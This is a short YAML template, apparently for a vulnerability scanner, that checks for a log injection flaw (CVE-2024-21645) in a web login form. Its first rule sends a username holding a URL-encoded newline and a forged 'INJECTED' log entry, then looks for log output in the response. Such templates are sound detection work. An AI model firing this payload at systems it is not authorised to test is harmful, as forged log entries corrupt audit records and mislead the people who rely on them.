cve-id: CVE-2024-21645
set:
  str: '{{rand_base(6)}}'
rules:
- method: POST
  path: /login?next={{RootURL}}
  headers:
    Content-Type: application/x-www-form-urlencoded
  body: |
    do=login&username={{randstr}}\'%0a[1970-01-01 00:00:00]  INJECTED               {{str}}  THIS ENTRY HAS BEEN INJECTED&password=wrong&submit=Login
  expression: 'response.body.bcontains(b"loglevellogsource") && response.status ==
    200 '
- method: POST
  path: /login?next={{RootURL}}/logs
  headers:
    Content-Type: application/x-www-form-urlencoded
  body: |
    do=login&username={{username}}&password={{password}}&submit=Login
  expression: 'response.body.bcontains(b"loglevellogsource") && response.status ==
    200 '
severity: medium
type: loginjection
